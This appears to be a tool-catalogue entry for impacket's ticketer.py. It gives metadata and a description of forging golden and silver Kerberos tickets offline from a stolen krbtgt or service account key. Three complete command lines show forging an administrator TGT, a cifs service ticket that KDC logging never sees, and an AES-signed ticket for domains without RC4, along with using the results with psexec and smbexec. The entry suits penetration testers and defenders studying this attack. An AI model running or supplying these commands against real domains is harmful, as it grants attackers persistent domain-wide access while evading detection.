---
name: "impacket-ticketer"
categories:
  - corpus-windows
homepage: "https://github.com/fortra/impacket"
origin: "corpus"
github-repo: "fortra/impacket"
packaged-by: []
meta-checked: "2026-11-09"
github-commits-year: 169
gh-activity-checked: "2026-11-09"
worth: 6.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
---

# impacket-ticketer

> Forge golden and silver Kerberos tickets offline from the krbtgt or service account key.

## What it's for

ticketer.py builds Kerberos tickets locally instead of asking the KDC: a golden ticket (a forged TGT, when no `-spn` is given) signed with the krbtgt key, or a silver ticket (a forged TGS for one SPN, with `-spn`) signed with the service account's key. The signing key comes from `-nthash`, `-aesKey` or, for silver tickets, a `-keytab`; `-domain` and `-domain-sid` are always required. The result is written as `<user>.ccache`, ready for impacket's `-k` tools via KRB5CCNAME. This is post-compromise persistence: the key must already be in hand (DC dump, cracked SPN hash), and forging gives no help toward getting one.

## Typical use cases

### Forge a golden ticket as a domain administrator

With the krbtgt NT hash and the domain SID, mint a TGT for any name.

```
impacket-ticketer -nthash 0123456789abcdef0123456789abcdef -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain example.com administrator
```

Outcome: creates `administrator.ccache` — a TGT for "administrator" carrying the default high-privilege PAC (user-id 500, groups 512/513/518/519/520); use `KRB5CCNAME=administrator.ccache` with impacket `-k` tools (psexec, smbexec, …) for domain-wide access for as long as the krbtgt key stays valid.

### Forge a silver ticket for one service

With a service account's key, forge a TGS scoped to that SPN without contacting the KDC.

```
impacket-ticketer -nthash 0123456789abcdef0123456789abcdef -domain example.com -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -spn cifs/dc01.example.com administrator
```

Outcome: writes `administrator.ccache` containing a cifs service ticket for dc01; it authenticates to that service only (forge separate host/, http/, mssqlsvc/ tickets for other services) and is invisible to KDC logging since no request was ever made.

### Forge with an AES key and a bounded lifetime

Same attack where RC4-HMAC is disabled and the AES key is what's held.

```
impacket-ticketer -aesKey a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90 -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain example.com -duration 168 administrator
```

Outcome: signs the golden ticket with AES (128/256-bit as supplied) and caps its lifetime at 168 hours instead of the 87600-hour default — compatible with domains that reject RC4, and easier to keep within policy.
